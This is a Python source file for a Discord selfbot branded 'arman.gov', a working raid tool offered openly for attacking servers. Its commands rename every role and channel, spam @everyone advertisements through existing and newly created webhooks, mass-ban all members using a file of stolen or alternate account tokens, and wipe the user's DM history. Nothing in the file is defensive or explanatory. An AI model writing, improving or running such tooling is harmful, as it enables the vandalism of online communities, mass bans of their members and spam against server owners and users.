import discord
import asyncio
from discord.ext import commands
import aiohttp
import httpx
from colorama import init, Fore
import os

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

token = "maintokenhere"
categoryname = "arman.gov"
channelname = "arman-gov"
rolename = "arman-gov"
webhookname = "arman.gov"
webhookmsg = "@everyone Arman.gov is the best supplier for skids."

intents = discord.Intents.all()
arman = commands.Bot(command_prefix=".", self_bot=True, intents=intents)

clear()
print(Fore.MAGENTA + "Made by arman - Selfbot initializing...")

@arman.event
async def on_ready():
    clear()
    print(Fore.GREEN + f"{arman.user} is ready - Made by arman")

@arman.command()
async def nuke(ctx):
    try: await ctx.message.delete()
    except: pass

    clear()
    print(Fore.MAGENTA + "Starting nuke - Made by arman")

    cat = None
    for c in ctx.guild.categories:
        if c.name.lower() == categoryname.lower():
            cat = c
            break
    if not cat:
        cat = await ctx.guild.create_category(categoryname)

    roleq = asyncio.Queue()
    for r in ctx.guild.roles:
        if not r.managed and r != ctx.guild.default_role:
            await roleq.put(r)

    chanq = asyncio.Queue()
    for ch in ctx.guild.channels:
        await chanq.put(ch)

    async def rolework():
        while not roleq.empty():
            r = await roleq.get()
            try:
                await r.edit(name=rolename, mentionable=True)
                print(Fore.CYAN + f"[ROLE] renamed {r.name}")
            except Exception as e:
                print(Fore.RED + f"[ROLE] failed {r.name}: {e}")
            roleq.task_done()

    async def chanwork():
        async with aiohttp.ClientSession() as sess:
            while not chanq.empty():
                ch = await chanq.get()
                try:
                    await ch.edit(name=channelname, category=cat)
                    print(Fore.CYAN + f"[CHAN] renamed and moved {ch.name}")
                except Exception as e:
                    print(Fore.RED + f"[CHAN] failed {ch.name}: {e}")

                try:
                    whs = await ch.guild.webhooks()
                    for wh in whs:
                        if wh.channel.id == ch.id:
                            for _ in range(3):
                                try:
                                    await sess.post(wh.url, json={"content": webhookmsg})
                                except: pass

                    wh1 = await ch.create_webhook(name=webhookname + "-1")
                    for _ in range(3):
                        try:
                            await sess.post(wh1.url, json={"content": webhookmsg})
                        except: pass
                    await wh1.edit(name=webhookname + "-2")

                    wh2 = await ch.create_webhook(name=webhookname + "-3")
                    for _ in range(3):
                        try:
                            await sess.post(wh2.url, json={"content": webhookmsg})
                        except: pass

                except Exception as e:
                    print(Fore.RED + f"[WEBHOOK] error in {ch.name}: {e}")

                chanq.task_done()

    workers = []
    for _ in range(3):
        workers.append(asyncio.create_task(rolework()))
    for _ in range(4):
        workers.append(asyncio.create_task(chanwork()))

    await asyncio.gather(*workers)
    clear()
    print(Fore.MAGENTA + "Nuke complete - Made by arman")

@arman.command()
async def banall(ctx):
    try: await ctx.message.delete()
    except: pass

    clear()
    print(Fore.MAGENTA + "Starting banall - Made by arman")

    with open("tokens.txt", "r") as f:
        toks = [l.strip() for l in f if l.strip()]

    if not toks:
        print(Fore.RED + "tokens.txt empty or missing - Made by arman")
        return

    gid = ctx.guild.id
    headersTemp = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
    }

    async def bantok(tok):
        async with httpx.AsyncClient() as client:
            for m in ctx.guild.members:
                if m.id == arman.user.id:
                    continue
                url = f"https://discord.com/api/v9/guilds/{gid}/bans/{m.id}"
                head = headersTemp.copy()
                head["Authorization"] = tok
                try:
                    res = await client.put(url, headers=head)
                    if res.status_code == 204:
                        print(Fore.GREEN + f"[BAN][Tok:{tok[:8]}] banned {m} - arman")
                    elif res.status_code == 403:
                        print(Fore.YELLOW + f"[BAN][Tok:{tok[:8]}] forbidden {m}")
                    elif res.status_code == 404:
                        print(Fore.RED + f"[BAN][Tok:{tok[:8]}] not found {m}")
                    else:
                        print(Fore.RED + f"[BAN][Tok:{tok[:8]}] fail {m}: {res.status_code}")
                except Exception as e:
                    print(Fore.RED + f"[BAN][Tok:{tok[:8]}] error {m}: {e}")

    await asyncio.gather(*(bantok(t) for t in toks))
    clear()
    print(Fore.MAGENTA + "Banall complete - Made by arman")

@arman.command()
async def bypass(ctx):
    try: await ctx.message.delete()
    except: pass

    async with aiohttp.ClientSession() as sess:

        async def spamwh(wh):
            for _ in range(6):
                try:
                    await sess.post(wh.url, json={"content": webhookmsg})
                except:
                    pass
                await asyncio.sleep(0.5)

        whlist = await ctx.guild.webhooks()
        for w in whlist:
            await spamwh(w)

        for ch in ctx.guild.channels:
            try:
                w1 = await ch.create_webhook(name=webhookname + "-1")
                for _ in range(3):
                    await sess.post(w1.url, json={"content": webhookmsg})
                await w1.edit(name=webhookname + "-2")
                w2 = await ch.create_webhook(name=webhookname + "-3")
                for _ in range(3):
                    await sess.post(w2.url, json={"content": webhookmsg})
            except:
                continue

@arman.command()
async def purge(ctx):
    try: await ctx.message.delete()
    except: pass

    dms = [dm for dm in arman.private_channels if isinstance(dm, discord.DMChannel)]

    q = asyncio.Queue()
    for dm in dms:
        await q.put(dm)

    async def deleter():
        while not q.empty():
            ch = await q.get()
            try:
                async for m in ch.history(limit=None):
                    await m.delete()
                print(Fore.CYAN + f"[PURGE] deleted all messages in dm with {ch.recipient}")
            except Exception as e:
                print(Fore.RED + f"[PURGE] failed in dm with {ch.recipient}: {e}")
            q.task_done()

    workers = []
    for _ in range(5):
        workers.append(asyncio.create_task(deleter()))

    await asyncio.gather(*workers)
    clear()
    print(Fore.MAGENTA + "Purge complete - Made by arman")

@arman.command()
async def help(ctx):
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="Arman.gov Selfbot", color=0xFF69B4)
    embed.add_field(name=".nuke", value="Rename roles & channels, spam webhooks", inline=False)
    embed.add_field(name=".banall", value="Ban all members using tokens from tokens.txt", inline=False)
    embed.add_field(name=".bypass", value="Spam existing and new webhooks", inline=False)
    embed.add_field(name=".purge", value="Delete all messages in your DMs", inline=False)
    embed.set_footer(text="arman.gov created this.")

    await ctx.send(embed=embed)

arman.run(token, bot=False)
